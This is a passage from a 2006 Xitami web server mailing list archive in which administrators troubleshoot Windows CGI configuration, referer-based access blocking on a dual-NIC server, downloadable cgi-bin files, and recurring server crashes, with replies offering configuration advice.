+> using two different REXX products and a .bat file. The failure occurs after
+> the cgi-bin routine terminates.
+> These files will recreate the problem.
+> 
+> defaults.cfg
+> 
+> #*END
+> 
+> [Cgi]
+>      stdio=0
+> 
+> testhtml.html
+> 
+> <html>
+> <head>
+> <title>Test HTML</title>
+> </head>
+> <body>
+> <a href="http://bplanet.ipupdater.com/cgi-bin/testbat.bat">testbat</a><br>
+> </body>
+> </html>
+> 
+> testbat.bat
+> 
+> @ECHO ON
+> @ECHO I'm here
+> 
+> I have installed XITAMI in C:\XITAMI\Xitami-25\app 
+> 
+> 
+
+Johannes
+
+
+
+From admin at mrjdesign.net  Sun Feb 12 08:07:06 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Sun Feb 12 08:07:13 2006
+Subject: [Xitami] Urgent security issue (disable DL from in CGI
+  bin??)
+In-Reply-To: <6.2.0.14.0.20060210075235.01c52238@mail.mrjdesign.net>
+References: <6.2.0.14.0.20060210075235.01c52238@mail.mrjdesign.net>
+Message-ID: <6.2.0.14.0.20060212070620.01cbc060@mail.mrjdesign.net>
+
+Anwsering my own question after reading up a bit on this, I would assume 
+under the Xitami.cfg [CGI] section
+
+
+#   If 1, allows images, HTML, and other files in the cgi-bin
+#   directory. The CGI program can refer to these using relative
+#   addressing. If 0, such files are not permitted. Note that in any
+#   case, executable files (such as Perl scripts) are always executed,
+#   never downloaded.
+
+     mixed-url=1
+
+
+should be set to 0 to avoid any troubles?
+
+
+
+At 07:54 10/02/2006, you wrote:
+>How do I resolve this the best way?
+>
+>Any file, not directly executable stored in the CGI-BIN can be downloaded 
+>in a browser by simply pointing at it.
+>In IIS for instance you can turn that behavior off and only allow execute 
+>but not download.
+>
+>Is that possible in Xitami too?
+
+
+
+
+From admin at mrjdesign.net  Sun Feb 12 08:31:51 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Sun Feb 12 08:31:53 2006
+Subject: [Xitami] CGI trouble - identical cfg - different execution
+Message-ID: <6.2.0.14.0.20060212072214.01c52b10@mail.mrjdesign.net>
+
+Now I have spent nearly a week working out some minor issues with a CGI 
+configuration in VB.
+
+It is not the VB part that is causing grievances, as that I have down pat, 
+however the problem is as follows.
+
+My test machine is...
+
+Win XP SP1 with Xitami 2.5 C2 running a single website in the local NAT
+It has the default configuration files for the CGI environment as left 
+intact from setup.
+I have MDAC 2.8, MS Jet4.0 updates and all installed.
+
+My server, live machine
+
+has the indentical configuration as above, with two differences
+1) it has twice as much memory and drive space
+2) it also has a defaults.cfg file for defining some 10 virtual domains, 
+each with the std. setup for each.
+
+One further difference in this is
+
+the workstation works fine
+
+the server station does NOT.
+
+The errors I am getting are almost ridiculous.
+
+Std. windows error #13 Type error.
+
+I pass a internal call in the cgi called CGI_UserAgent which supposedly 
+returns the browser data.
+
+It works just fine on the workstation, AND on the server in an other cgi I 
+wrote using the same bas file.
+
+It does not in this but gives me this error.
+
+I rem the line, recompile and try again.
+
+Then I get a problem in the very next line, saying the same thing for 
+CGI_RemoteAddress
+which is just getting the visitors IP address in a string.
+
+This too, works in another cgi on both machines, but not in this one on the 
+server.
+
+For reference, the CGI's use standard I/O calls and work just ok in all 
+other cases.
+Only these bugs are about to drive me nuts.
+
+Does anyone have any idea as to why Xitami suddenly is so unstable??
+
+
+
+
+
+From admin at mrjdesign.net  Sun Feb 12 12:52:33 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Sun Feb 12 12:52:44 2006
+Subject: [Xitami] CGI trouble - identical cfg - different execution
+In-Reply-To: <6.2.0.14.0.20060212072214.01c52b10@mail.mrjdesign.net>
+References: <6.2.0.14.0.20060212072214.01c52b10@mail.mrjdesign.net>
+Message-ID: <6.2.0.14.0.20060212114024.01c66460@mail.mrjdesign.net>
+
+Further, VERY odd behaviors are now noted in this execution.
+
+I loaded the entire load of data for testing over to the server machines 
+root directory.
+Now, it is loaded in to the default directory of Xitami, bypassing any 
+virtual host paths and so on.
+This in it self should not have any bearing on the serving of pages, let 
+alone the execution of the very same code.
+
+After all I can easily pull the same information in a JS page or similar 
+script without any issues.
+
+However, to further complicate the issue.
+
+The server box is running through dual NICs
+
+Assume for the sake of conversation that I have a
+
+http://localhost which is 127.0.0.1
+
+Then I have two (2) IP addresses which are public (Static) to the internet
+
+10.0.0.99 and 10.0.0.98
+
+(of course these are fictitious and should be (83.###.#.##) and something 
+else but it's an example)
+
+When I execute the CGI on 127.0.0.1/MyPage.htm and send the call by a 
+simple GET to the CGI-BIN the code works perfectly!
+Not a single fault anywhere to be seen.
+
+When I execute the code on 10.0.0.99 it bumps me around saying, I executed 
+from a non permissable CGI_Referer
+HA... the code actually works.
+
+I wrote a thing that disallows cross linking from other domains so you 
+can't run the cgi embedded in an other web site and call my pages from the 
+other site.
+
+Then, thinking logically...
+
+If the 10.0.0.99 page is disallowed, the page will thereby assume it self 
+as running on 10.0.0.98 in this case,
+so the thread in Xitami actually waking up to the call to the page is 
+located on the other IP.
+
+I opened a page in 10.0.0.98/MyPage.htm instead and executed the click by 
+doing a Get for the page
+
+myCGI.exe?Param1=0&Param2=6574&Param3=9&ParamText=
+
+is now returning the same goofball errors as before.
+
+Previously noted above, everything picks up correctly, and is collected as 
+should be.
+In this case, when being on the correct IP and all, the cgi doesn't even 
+allow me to get CG_Referer as a string.
+Nor CG_RemoteAddr or any other data.
+
+Talk about  a backwards acting resolution of the system
+
+
+So in conclusion.
+
+
+1) I have to remove my IP blocking system and open up for cross linking or 
+I have to find a way to allow two or more CGI_Referer values to enable this 
+security feature when running Xitami on dual NIC's
+
+2) Has anyone else had any experience with trying to limit callers from 
+other domains to avoid getting connections from outside URL's and IP's, and 
+how did you solve this?
+
+Thankful for any hints and pointers as usual.
+
+
+
+
+
+
+At 07:31 12/02/2006, you wrote:
+>Now I have spent nearly a week working out some minor issues with a CGI 
+>configuration in VB.
+>
+>It is not the VB part that is causing grievances, as that I have down pat, 
+>however the problem is as follows.
+>
+>My test machine is...
+>
+>Win XP SP1 with Xitami 2.5 C2 running a single website in the local NAT
+>It has the default configuration files for the CGI environment as left 
+>intact from setup.
+>I have MDAC 2.8, MS Jet4.0 updates and all installed.
+>
+>My server, live machine
+>
+>has the indentical configuration as above, with two differences
+>1) it has twice as much memory and drive space
+>2) it also has a defaults.cfg file for defining some 10 virtual domains, 
+>each with the std. setup for each.
+>
+>One further difference in this is
+>
+>the workstation works fine
+>
+>the server station does NOT.
+>
+>The errors I am getting are almost ridiculous.
+>
+>Std. windows error #13 Type error.
+>
+>I pass a internal call in the cgi called CGI_UserAgent which supposedly 
+>returns the browser data.
+>
+>It works just fine on the workstation, AND on the server in an other cgi I 
+>wrote using the same bas file.
+>
+>It does not in this but gives me this error.
+>
+>I rem the line, recompile and try again.
+>
+>Then I get a problem in the very next line, saying the same thing for 
+>CGI_RemoteAddress
+>which is just getting the visitors IP address in a string.
+>
+>This too, works in another cgi on both machines, but not in this one on 
+>the server.
+>
+>For reference, the CGI's use standard I/O calls and work just ok in all 
+>other cases.
+>Only these bugs are about to drive me nuts.
+>
+>Does anyone have any idea as to why Xitami suddenly is so unstable??
+>
+>
+>
+>
+>
+>
+>--
+>Xitami Users Mailing List -- For Xitami support
+>To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+>
+
+-?2005-------------------------------
+MRJ Information Technology Ltd.
+35 Camden High St., Camden/London, NW1 7JE
+United Kingdom    http://www.mrjdesign.net
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060212/079e0a44/attachment.html
+From tuncer at dalan.com.tr  Mon Feb 13 08:14:01 2006
+From: tuncer at dalan.com.tr (Ayhan Tuncer)
+Date: Mon Feb 13 08:08:36 2006
+Subject: [Xitami] CGI trouble - identical cfg - different execution
+Message-ID: <EE5D17F9BCAE5645B246C3307D8550725F1E93@mailsrv.dalan.local>
+
+I hope someone can remark on the real causes/solutions you are looking
+for. 
+
+You probably knnow these already, buf if all else fails some plain old
+solutions: 
+
+In order to restrict requests to the cgi-bin entirely, 
+- you could password-protect the cgi-bin directory through a
+"mywebsite.aut".
+
+To restrict access to this particular cgi program 
+- you can put the program in an individual directory under cgi-bin and
+password-protect that one
+- you can use a cookies + login module 
+- if all your internal IPs are known and permanent, you can use a module
+to disallow all other IPs.
+
+- - -
+
+-----Original Message-----
+From: xitami-bounces@lists.xitami.org
+[mailto:xitami-bounces@lists.xitami.org] On Behalf Of MRJ InfoTech Admin
+Sent: Sunday, February 12, 2006 1:53 PM
+To: Xitami Users General Discussion
+Subject: Re: [Xitami] CGI trouble - identical cfg - different execution
+
+Further, VERY odd behaviors are now noted in this execution.
+
+I loaded the entire load of data for testing over to the server machines
+root directory.
+Now, it is loaded in to the default directory of Xitami, bypassing any
+virtual host paths and so on.
+This in it self should not have any bearing on the serving of pages, let
+alone the execution of the very same code.
+
+After all I can easily pull the same information in a JS page or similar
+script without any issues.
+
+However, to further complicate the issue.
+
+The server box is running through dual NICs
+
+Assume for the sake of conversation that I have a 
+
+http://localhost <http://localhost/>  which is 127.0.0.1
+
+Then I have two (2) IP addresses which are public (Static) to the
+internet 
+
+10.0.0.99 and 10.0.0.98
+
+(of course these are fictitious and should be (83.###.#.##) and
+something else but it's an example)
+
+When I execute the CGI on 127.0.0.1/MyPage.htm and send the call by a
+simple GET to the CGI-BIN the code works perfectly!
+Not a single fault anywhere to be seen.
+
+When I execute the code on 10.0.0.99 it bumps me around saying, I
+executed from a non permissable CGI_Referer
+HA... the code actually works.
+
+I wrote a thing that disallows cross linking from other domains so you
+can't run the cgi embedded in an other web site and call my pages from
+the other site.
+
+Then, thinking logically...
+
+If the 10.0.0.99 page is disallowed, the page will thereby assume it
+self as running on 10.0.0.98 in this case, 
+so the thread in Xitami actually waking up to the call to the page is
+located on the other IP.
+
+I opened a page in 10.0.0.98/MyPage.htm instead and executed the click
+by doing a Get for the page
+
+myCGI.exe?Param1=0&Param2=6574&Param3=9&ParamText=
+
+is now returning the same goofball errors as before.
+
+Previously noted above, everything picks up correctly, and is collected
+as should be.
+In this case, when being on the correct IP and all, the cgi doesn't even
+allow me to get CG_Referer as a string.
+Nor CG_RemoteAddr or any other data.
+
+Talk about  a backwards acting resolution of the system
+
+
+So in conclusion.
+
+
+1) I have to remove my IP blocking system and open up for cross linking
+or I have to find a way to allow two or more CGI_Referer values to
+enable this security feature when running Xitami on dual NIC's
+
+2) Has anyone else had any experience with trying to limit callers from
+other domains to avoid getting connections from outside URL's and IP's,
+and how did you solve this?
+
+Thankful for any hints and pointers as usual.
+
+
+
+
+
+
+At 07:31 12/02/2006, you wrote:
+
+
+	Now I have spent nearly a week working out some minor issues
+with a CGI configuration in VB.
+	
+	It is not the VB part that is causing grievances, as that I have
+down pat, however the problem is as follows.
+	
+	My test machine is...
+	
+	Win XP SP1 with Xitami 2.5 C2 running a single website in the
+local NAT
+	It has the default configuration files for the CGI environment
+as left intact from setup.
+	I have MDAC 2.8, MS Jet4.0 updates and all installed.
+	
+	My server, live machine
+	
+	has the indentical configuration as above, with two differences
+	1) it has twice as much memory and drive space
+	2) it also has a defaults.cfg file for defining some 10 virtual
+domains, each with the std. setup for each.
+	
+	One further difference in this is
+	
+	the workstation works fine
+	
+	the server station does NOT.
+	
+	The errors I am getting are almost ridiculous.
+	
+	Std. windows error #13 Type error.
+	
+	I pass a internal call in the cgi called CGI_UserAgent which
+supposedly returns the browser data.
+	
+	It works just fine on the workstation, AND on the server in an
+other cgi I wrote using the same bas file.
+	
+	It does not in this but gives me this error.
+	
+	I rem the line, recompile and try again.
+	
+	Then I get a problem in the very next line, saying the same
+thing for CGI_RemoteAddress
+	which is just getting the visitors IP address in a string.
+	
+	This too, works in another cgi on both machines, but not in this
+one on the server.
+	
+	For reference, the CGI's use standard I/O calls and work just ok
+in all other cases.
+	Only these bugs are about to drive me nuts.
+	
+	Does anyone have any idea as to why Xitami suddenly is so
+unstable??
+	
+	
+	
+	
+	
+	
+	--
+	Xitami Users Mailing List -- For Xitami support
+	To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+<http://lists.xitami.org/mailman/listinfo/xitami> 
+	
+	
+
+-(c)2005-------------------------------
+MRJ Information Technology Ltd.
+35 Camden High St., Camden/London, NW1 7JE
+United Kingdom    http://www.mrjdesign.net <http://www.mrjdesign.net/>  
+
+From admin at mrjdesign.net  Tue Feb 14 15:40:28 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Wed Feb 15 09:13:15 2006
+Subject: [Xitami] CGI trouble - identical cfg - different execution
+In-Reply-To: <EE5D17F9BCAE5645B246C3307D8550725F1E93@mailsrv.dalan.local
+ >
+References: <EE5D17F9BCAE5645B246C3307D8550725F1E93@mailsrv.dalan.local>
+Message-ID: <6.2.5.6.0.20060214143710.01beeea8@mrjdesign.net>
+
+
+What I was looking more or less to do, is adding a way to monitor
+A) who the requesting IP is, and block them on 
+the fly if they hit to hard or to frequent
+B) to log the incoming IP to verify at the same 
+time if the CGI referer is local or from an
+outside source, in which case I can refuse 
+connections and send them to the primary
+access page, routing all traffic from the own web 
+site to access the page in question.
+
+The later I will likely have to do using a simple 
+JavaScript testing the referer vs. the document.domain property.
+
+Thanks for your other hints though.
+
+MRJ
+
+At 07:14 13/02/2006, you wrote:
+>I hope someone can remark on the real causes/solutions you are looking
+>for.
+>
+>You probably knnow these already, buf if all else fails some plain old
+>solutions:
+>
+>In order to restrict requests to the cgi-bin entirely,
+>- you could password-protect the cgi-bin directory through a
+>"mywebsite.aut".
+>
+>To restrict access to this particular cgi program
+>- you can put the program in an individual directory under cgi-bin and
+>password-protect that one
+>- you can use a cookies + login module
+>- if all your internal IPs are known and permanent, you can use a module
+>to disallow all other IPs.
+>
+>- - -
+>
+>-----Original Message-----
+>From: xitami-bounces@lists.xitami.org
+>[mailto:xitami-bounces@lists.xitami.org] On Behalf Of MRJ InfoTech Admin
+>Sent: Sunday, February 12, 2006 1:53 PM
+>To: Xitami Users General Discussion
+>Subject: Re: [Xitami] CGI trouble - identical cfg - different execution
+>
+>Further, VERY odd behaviors are now noted in this execution.
+>
+>I loaded the entire load of data for testing over to the server machines
+>root directory.
+>Now, it is loaded in to the default directory of Xitami, bypassing any
+>virtual host paths and so on.
+>This in it self should not have any bearing on the serving of pages, let
+>alone the execution of the very same code.
+>
+>After all I can easily pull the same information in a JS page or similar
+>script without any issues.
+>
+>However, to further complicate the issue.
+>
+>The server box is running through dual NICs
+>
+>Assume for the sake of conversation that I have a
+>
+>http://localhost <http://localhost/>  which is 127.0.0.1
+>
+>Then I have two (2) IP addresses which are public (Static) to the
+>internet
+>
+>10.0.0.99 and 10.0.0.98
+>
+>(of course these are fictitious and should be (83.###.#.##) and
+>something else but it's an example)
+>
+>When I execute the CGI on 127.0.0.1/MyPage.htm and send the call by a
+>simple GET to the CGI-BIN the code works perfectly!
+>Not a single fault anywhere to be seen.
+>
+>When I execute the code on 10.0.0.99 it bumps me around saying, I
+>executed from a non permissable CGI_Referer
+>HA... the code actually works.
+>
+>I wrote a thing that disallows cross linking from other domains so you
+>can't run the cgi embedded in an other web site and call my pages from
+>the other site.
+>
+>Then, thinking logically...
+>
+>If the 10.0.0.99 page is disallowed, the page will thereby assume it
+>self as running on 10.0.0.98 in this case,
+>so the thread in Xitami actually waking up to the call to the page is
+>located on the other IP.
+>
+>I opened a page in 10.0.0.98/MyPage.htm instead and executed the click
+>by doing a Get for the page
+>
+>myCGI.exe?Param1=0&Param2=6574&Param3=9&ParamText=
+>
+>is now returning the same goofball errors as before.
+>
+>Previously noted above, everything picks up correctly, and is collected
+>as should be.
+>In this case, when being on the correct IP and all, the cgi doesn't even
+>allow me to get CG_Referer as a string.
+>Nor CG_RemoteAddr or any other data.
+>
+>Talk about  a backwards acting resolution of the system
+>
+>
+>So in conclusion.
+>
+>
+>1) I have to remove my IP blocking system and open up for cross linking
+>or I have to find a way to allow two or more CGI_Referer values to
+>enable this security feature when running Xitami on dual NIC's
+>
+>2) Has anyone else had any experience with trying to limit callers from
+>other domains to avoid getting connections from outside URL's and IP's,
+>and how did you solve this?
+>
+>Thankful for any hints and pointers as usual.
+>
+>
+>
+>
+>
+>
+>At 07:31 12/02/2006, you wrote:
+>
+>
+>         Now I have spent nearly a week working out some minor issues
+>with a CGI configuration in VB.
+>
+>         It is not the VB part that is causing grievances, as that I have
+>down pat, however the problem is as follows.
+>
+>         My test machine is...
+>
+>         Win XP SP1 with Xitami 2.5 C2 running a single website in the
+>local NAT
+>         It has the default configuration files for the CGI environment
+>as left intact from setup.
+>         I have MDAC 2.8, MS Jet4.0 updates and all installed.
+>
+>         My server, live machine
+>
+>         has the indentical configuration as above, with two differences
+>         1) it has twice as much memory and drive space
+>         2) it also has a defaults.cfg file for defining some 10 virtual
+>domains, each with the std. setup for each.
+>
+>         One further difference in this is
+>
+>         the workstation works fine
+>
+>         the server station does NOT.
+>
+>         The errors I am getting are almost ridiculous.
+>
+>         Std. windows error #13 Type error.
+>
+>         I pass a internal call in the cgi called CGI_UserAgent which
+>supposedly returns the browser data.
+>
+>         It works just fine on the workstation, AND on the server in an
+>other cgi I wrote using the same bas file.
+>
+>         It does not in this but gives me this error.
+>
+>         I rem the line, recompile and try again.
+>
+>         Then I get a problem in the very next line, saying the same
+>thing for CGI_RemoteAddress
+>         which is just getting the visitors IP address in a string.
+>
+>         This too, works in another cgi on both machines, but not in this
+>one on the server.
+>
+>         For reference, the CGI's use standard I/O calls and work just ok
+>in all other cases.
+>         Only these bugs are about to drive me nuts.
+>
+>         Does anyone have any idea as to why Xitami suddenly is so
+>unstable??
+>
+>
+>
+>
+>
+>
+>         --
+>         Xitami Users Mailing List -- For Xitami support
+>         To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+><http://lists.xitami.org/mailman/listinfo/xitami>
+>
+>
+>
+>-(c)2005-------------------------------
+>MRJ Information Technology Ltd.
+>35 Camden High St., Camden/London, NW1 7JE
+>United Kingdom    http://www.mrjdesign.net <http://www.mrjdesign.net/>
+>
+>
+>--
+>Xitami Users Mailing List -- For Xitami support
+>To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+
+-?2005-------------------------------
+MRJ Information Technology Ltd.
+35 Camden High St., Camden/London, NW1 7JE
+United Kingdom    http://www.mrjdesign.net
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060214/8b022d81/attachment.htm
+From tuncer at dalan.com.tr  Wed Feb 15 14:43:16 2006
+From: tuncer at dalan.com.tr (Ayhan Tuncer)
+Date: Wed Feb 15 14:37:53 2006
+Subject: [Xitami] CGI trouble - identical cfg - different execution
+Message-ID: <EE5D17F9BCAE5645B246C3307D8550725F21FD@mailsrv.dalan.local>
+
+All you have written below is a little complicated to understand. I
+don't write in VB for example, I write in Perl. 
+
+And I haven't been able to understand why the NICs influence what
+happens  and how the IP is a problem. Unless you have assigned
+independent config files and disabled cgi in each and everyone of these
+problem IPs you mention, the IP should not matter. A referrer is a
+referrer, a simple url, no matter which IP or domain it is located on.
+
+1) I have not been able to find a Std. windows error #13 Type error. The
+ones I know have three digits. Eg: Error Code 121.
+What does the #13 Type error say? 
+
+3) If CGI is enabled on all of the 10 different domain configurations,
+the http-referer and the remote-addr fields are on the environment hash
+by default (environment=0). You do not have to set the environment to 1
+in config to have them on the hash. 
+
+4) The http-referer will exist in the environment hash, only if there
+actually was a referrer (a mouse click on a link or a submit button on a
+real page bringing the user to your url). If the url was typed into the
+address bar of the browser, there will be no http-referer. Then your
+program  can not read it then from the environment hash.
+
+5) Did you print out the environment hash to yourself, under the
+conditions that the error occurs in your browser? What do the fields
+say? Which IP do you appear to have when the error occurs? What does the
+http-referer say? What does your program do with this information? In
+which line of your program does the problem happen? Is your test logic
+entirely correct?
+
+Ayhan
+
+- - -
+
+
+Sent: Tuesday, February 14, 2006 4:40 PM
+
+What I was looking more or less to do, is adding a way to monitor 
+A) who the requesting IP is, and block them on the fly if they hit to
+hard or to frequent 
+B) to log the incoming IP to verify at the same time if the CGI referer
+is local or from an
+outside source, in which case I can refuse connections and send them to
+the primary 
+access page, routing all traffic from the own web site to access the
+page in question.
+
+The later I will likely have to do using a simple JavaScript testing the
+referer vs. the document.domain property.
+
+
+
+At 07:14 13/02/2006, you wrote:
+
+
+	I hope someone can remark on the real causes/solutions you are
+looking
+	for. 
+
+	
+	Sent: Sunday, February 12, 2006 1:53 PM
+	
+	Further, VERY odd behaviors are now noted in this execution.	
+	I loaded the entire load of data for testing over to the server
+machines	root directory.
+	Now, it is loaded in to the default directory of Xitami,
+bypassing any
+	virtual host paths and so on.
+	This in it self should not have any bearing on the serving of
+pages, let
+	alone the execution of the very same code.
+	
+	After all I can easily pull the same information in a JS page or
+similar
+	script without any issues.
+	
+	However, to further complicate the issue.
+	
+	The server box is running through dual NICs
+	
+	Assume for the sake of conversation that I have a 
+	
+	http://localhost <http://localhost/>  <http://localhost/ >
+which is 127.0.0.1
+	
+	Then I have two (2) IP addresses which are public (Static) to
+the
+	internet 
+	
+	10.0.0.99 and 10.0.0.98
+	
+	(of course these are fictitious and should be (83.###.#.##) and
+	something else but it's an example)
+	
+	When I execute the CGI on 127.0.0.1/MyPage.htm and send the call
+by a
+	simple GET to the CGI-BIN the code works perfectly!
+	Not a single fault anywhere to be seen.
+	
+	When I execute the code on 10.0.0.99 it bumps me around saying,
+I
+	executed from a non permissable CGI_Referer
+	HA... the code actually works.
+	
+	I wrote a thing that disallows cross linking from other domains
+so you
+	can't run the cgi embedded in an other web site and call my
+pages from
+	the other site.
+	
+	Then, thinking logically...
+	
+	If the 10.0.0.99 page is disallowed, the page will thereby
+assume it
+	self as running on 10.0.0.98 in this case, 
+	so the thread in Xitami actually waking up to the call to the
+page is
+	located on the other IP.
+	
+	I opened a page in 10.0.0.98/MyPage.htm instead and executed the
+click
+	by doing a Get for the page
+	
+	myCGI.exe?Param1=0&Param2=6574&Param3=9&ParamText=
+	
+	is now returning the same goofball errors as before.
+	
+	Previously noted above, everything picks up correctly, and is
+collected
+	as should be.
+	In this case, when being on the correct IP and all, the cgi
+doesn't even
+	allow me to get CG_Referer as a string.
+	Nor CG_RemoteAddr or any other data.
+	
+	So in conclusion.
+	
+	1) I have to remove my IP blocking system and open up for cross
+linking
+	or I have to find a way to allow two or more CGI_Referer values
+to
+	enable this security feature when running Xitami on dual NIC's	
+	
+	
+	At 07:31 12/02/2006, you wrote:
+	
+	
+	        the workstation works fine
+	        
+	        the server station does NOT.
+	        
+	        Std. windows error #13 Type error.
+	        
+	        I pass a internal call in the cgi called CGI_UserAgent
+which
+	supposedly returns the browser data.
+	        
+	        It works just fine on the workstation, AND on the server
+in an
+	other cgi I wrote using the same bas file.
+	        
+	        It does not in this but gives me this error.
+	        
+	        I rem the line, recompile and try again.
+	        
+	        Then I get a problem in the very next line, saying the
+same
+	thing for CGI_RemoteAddress
+	        which is just getting the visitors IP address in a
+string.
+	        
+	        This too, works in another cgi on both machines, but not
+in this
+	one on the server.
+	        
+	        For reference, the CGI's use standard I/O calls and work
+just ok
+	in all other cases.
+	        
+	
+
+From admin at mrjdesign.net  Mon Feb 20 19:18:25 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Mon Feb 20 19:18:38 2006
+Subject: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+Message-ID: <6.2.5.6.0.20060220180742.01bd2810@mrjdesign.net>
+
+
+
+The Xitami server I am running, 2.5c2 seems to 
+hold up very well as far as running html and some other simple CGI's on.
+However I keep have a huge problem. Whenever I 
+turn my back on the machine, it crashes.
+
+I'm serious, not kidding, as long I am working on 
+the machine or looking at the server, it seems ok and has no crashes at all.
+As soon I leave it to itself for a day, I get a hung up on something.
+
+I turned on the debug options and the debug 
+option for CGI's as well and I cant even see any 
+debug log files for the server in these 
+instances, which leads me to believe everything 
+is fine with the CGI's and the HTML.
+
+I spent a day the other week cleaning up any 
+missing linked background images and so on, and 
+that doesn't seem to fix the problem either.
+
+The logs are approx. as follows.
+
+10 % goes to one virtual host which is serving 
+practically one or two images to a forum, as an off site image linker only.
+
+20% to another virtual host which has received 
+about  19-20,000 pageviews in the past two weeks.
+         Multiply this with about 12 for the 
+actual number of logged hits to the server logs.
+
+2% of the hits go to a base web site mentioned 
+below. This is just a light weight survey CGI 
+running up that right now and only some minute hits so far.
+
+All the other hits go to a image archive web 
+site, which logs app. 12-14 hits per pageview and 
+so far I got 5000 pageviews in the past 5 days.
+
+It's not that big at all when you consider the 
+comparative number of hits I can see on Apache servers and IIS machines around.
+
+What actually happens is, two out of three 
+crashes state there is a C++ error in Xitami and 
+it must be restarted and you are shown the option to restart .
+
+1/3 of the crashes are critical and gives me a 
+C++ error and the server simply shuts down. You 
+are not show the option to restart in this case.
+
+The really nasty thing is nothing works until you 
+manually go in and restart the server in which 
+time the sites all appear as off line and refuse connections.
+
+Since I don't have the form titles I cant write a 
+program to catch these events as they appear and 
+do some automation task to make up for it.
+
+Does anyone have any suggestions in how to resolve this?
+
+Thanks in advance.
+
+
+
+-?1999-2006-------------------------------
+MRJ Information Technology Ltd.
+35 Camden High St., Camden/London, NW1 7JE
+United Kingdom    http://www.mrjdesign.net
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060220/1c5182b6/attachment.html
+From ph at imatix.com  Mon Feb 20 19:21:05 2006
+From: ph at imatix.com (Pieter Hintjens)
+Date: Mon Feb 20 19:21:08 2006
+Subject: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+In-Reply-To: <6.2.5.6.0.20060220180742.01bd2810@mrjdesign.net>
+References: <6.2.5.6.0.20060220180742.01bd2810@mrjdesign.net>
+Message-ID: <5821ea240602201021m4a8a10a7mec62f9adc334b34c@mail.gmail.com>
+
+On 2/20/06, MRJ InfoTech Admin <admin@mrjdesign.net> wrote:
+
+>  However I keep have a huge problem. Whenever I turn my back on the machine,
+> it crashes.
+
+If you have enabled FTP, switch it off.  This is one common cause for crashes.
+
+-Pieter Hintjens
+
+From admin at mrjdesign.net  Mon Feb 20 19:23:45 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Mon Feb 20 19:23:49 2006
+Subject: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+In-Reply-To: <5821ea240602201021m4a8a10a7mec62f9adc334b34c@mail.gmail.co
+ m>
+References: <6.2.5.6.0.20060220180742.01bd2810@mrjdesign.net>
+	<5821ea240602201021m4a8a10a7mec62f9adc334b34c@mail.gmail.com>
+Message-ID: <6.2.5.6.0.20060220182300.01c497f8@mrjdesign.net>
+
+
+I turned off the FTP completely since I dont 
+really use it for this current setup and I am 
+looking to use an SFTP solution in a near future.
+The FTP does not have any effect on this since It's all off.
+
+At 18:21 20/02/2006, you wrote:
+>On 2/20/06, MRJ InfoTech Admin <admin@mrjdesign.net> wrote:
+>
+> >  However I keep have a huge problem. Whenever 
+> I turn my back on the machine,
+> > it crashes.
+>
+>If you have enabled FTP, switch it off.  This is one common cause for crashes.
+>
+>-Pieter Hintjens
+>
+>
+>--
+>Xitami Users Mailing List -- For Xitami support
+>To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+
+-?2005-------------------------------
+MRJ Information Technology Ltd.
+35 Camden High St., Camden/London, NW1 7JE
+United Kingdom    http://www.mrjdesign.net
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060220/d25f1e71/attachment.htm
+From ph at imatix.com  Mon Feb 20 19:25:40 2006
+From: ph at imatix.com (Pieter Hintjens)
+Date: Mon Feb 20 19:25:44 2006
+Subject: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+In-Reply-To: <6.2.5.6.0.20060220182300.01c497f8@mrjdesign.net>
+References: <6.2.5.6.0.20060220180742.01bd2810@mrjdesign.net>
+	<5821ea240602201021m4a8a10a7mec62f9adc334b34c@mail.gmail.com>
+	<6.2.5.6.0.20060220182300.01c497f8@mrjdesign.net>
+Message-ID: <5821ea240602201025g145bdbdfi43500ac1f086ed85@mail.gmail.com>
+
+On 2/20/06, MRJ InfoTech Admin <admin@mrjdesign.net> wrote:
+>
+>  I turned off the FTP completely since I dont really use it for this current
+> setup and I am looking to use an SFTP solution in a near future.
+>  The FTP does not have any effect on this since It's all off.
+
+It is possible that some other software is causing Xitami to crash.  A
+common culprit is anti-virus scanners.
+
+-Pieter Hintjens
+
+From admin at mrjdesign.net  Mon Feb 20 19:31:35 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Mon Feb 20 19:31:40 2006
+Subject: [Xitami] CGI trouble - identical cfg - different execution
+In-Reply-To: <EE5D17F9BCAE5645B246C3307D8550725F21FD@mailsrv.dalan.local
+ >
+References: <EE5D17F9BCAE5645B246C3307D8550725F21FD@mailsrv.dalan.local>
+Message-ID: <6.2.5.6.0.20060220182357.01c62e90@mrjdesign.net>
+
+At 13:43 15/02/2006, you wrote:
+>All you have written below is a little complicated to understand. I
+>don't write in VB for example, I write in Perl.
+>
+>And I haven't been able to understand why the NICs influence what
+>happens  and how the IP is a problem. Unless you have assigned
+>independent config files and disabled cgi in each and everyone of these
+>problem IPs you mention, the IP should not matter. A referrer is a
+>referrer, a simple url, no matter which IP or domain it is located on.
+>
+>1) I have not been able to find a Std. windows error #13 Type error. The
+>ones I know have three digits. Eg: Error Code 121.
+>What does the #13 Type error say?
+
+Error #13 is MS Error for type casting in VB.
+Basically it should only appear if you try to set a Long value to a 
+Double or a Long to a String
+You should be able to pass anything to a Variant in VB since it's 
+accepting anything but not even that worked.
+
+>3) If CGI is enabled on all of the 10 different domain configurations,
